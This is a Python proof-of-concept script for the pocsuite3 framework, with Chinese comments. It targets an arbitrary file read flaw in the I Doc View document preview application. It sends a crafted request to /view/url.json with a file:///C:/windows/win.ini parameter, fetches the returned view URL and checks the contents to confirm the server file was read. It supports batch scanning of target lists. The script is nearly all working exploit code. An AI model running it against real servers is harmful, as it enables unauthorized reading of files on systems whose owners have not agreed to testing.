'''
Date: 2023-12-14 16:06:20
LastEditTime: 2023-12-14 16:41:10
FilePath: \i-doc-view\i-doc-view_url文件读取漏洞.py
Description: 

Copyright (c) 2023 by ${git_name_email}, All Rights Reserved. 
'''
from collections import OrderedDict
from urllib.parse import urljoin
import re,json
from pocsuite3.api import POCBase, Output, register_poc, logger, requests, OptDict, OptString, VUL_TYPE
from pocsuite3.api import REVERSE_PAYLOAD, POC_CATEGORY


class POC(POCBase):
    vulID = '0'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = '1'  #默认为1
    author = ['']  #  PoC作者的大名
    vulDate = '2023-12-14'  #漏洞公开的时间,不知道就写今天
    createDate = '2023-12-14'  # 编写 PoC 的日期
    updateDate = '2023-12-14'  # PoC 更新的时间,默认和编写时间一样
    references = ['']  # 漏洞地址来源,0day不用写
    name = 'i-doc-view url 文件读取漏洞'  # PoC 名称
    appPowerLink = ''  # 漏洞厂商主页地址
    appName = 'I Doc View在线文档预览'  # 漏洞应用名称
    appVersion = ''''''  # 漏洞影响版本
    vulType = VUL_TYPE.ARBITRARY_FILE_READ #漏洞类型,类型参考见 漏洞类型规范表
    desc = '''
       i-doc-view url 文件读取漏洞，攻击者可构造恶意请求获取系统信息等及其它安全风险。
    '''

  # 漏洞简要描述
    samples = ['']  # 测试样列,就是用 PoC 测试成功的网站
    install_requires = ['']  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    pocDesc = '''
    检测:pocsuite -r .\poc++.py -u url(-f url.txt) --verify 
    '''
    category = POC_CATEGORY.EXPLOITS.REMOTE
    def _verify(self):
        result = {}
        path = "/view/url.json?url=file:///C:/windows/win.ini"
        headers={
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36',
            }
        try:
            resq = requests.get(url=self.url + path,headers=headers,timeout=5)
            if resq.status_code == 200 and  json.loads(resq.text)['code'] == '1':
                viewUrl = json.loads(resq.text)['data']['viewUrl']
                path_2 = viewUrl+'.json'
                resq_2 = requests.get(url=self.url + path_2,headers=headers,timeout=5)
                if json.loads(resq_2.text)['code'] == 1  and 'for 16-bit app support' in resq_2.text:
                    result['VerifyInfo'] = {}
                    result['VerifyInfo']['POC_1'] = self.url+path
                    result['VerifyInfo']['POC_2'] = self.url+path_2
        except Exception as e:
            #print(e)
            return
        return self.parse_output(result)

    def _attack(self):
        return self._verify()

    def parse_attack(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    def _shell(self):
        return

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
    
register_poc(POC)